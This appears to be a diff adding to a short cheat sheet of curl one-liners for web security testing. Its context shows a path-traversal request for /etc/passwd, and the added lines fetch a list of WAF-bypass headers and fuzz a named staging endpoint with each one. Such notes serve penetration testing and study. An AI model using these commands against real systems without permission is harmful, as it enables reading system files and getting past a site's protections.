@@ -36,3 +36,8 @@ Using curl for path traversal, use --path-as-is
 curl --path-as-is  -v "https://someapp.com/app/../../../../../etc/passwd"
 ```
 
+Using curl and list of header to test WAF bypass:
+```
+curl -O https://raw.githubusercontent.com/osamahamad/FUZZING/main/waf-bypass-headers.txt
+cat waf-bypass-headers.txt | xargs -I{} curl -s -w '{}: %{http_code}\n'  https://ext.stg.nser.cc/event/ -H"Authorization: Bearer test" -H 'content-type: application/json' -H'{}' -o /dev/null
+```
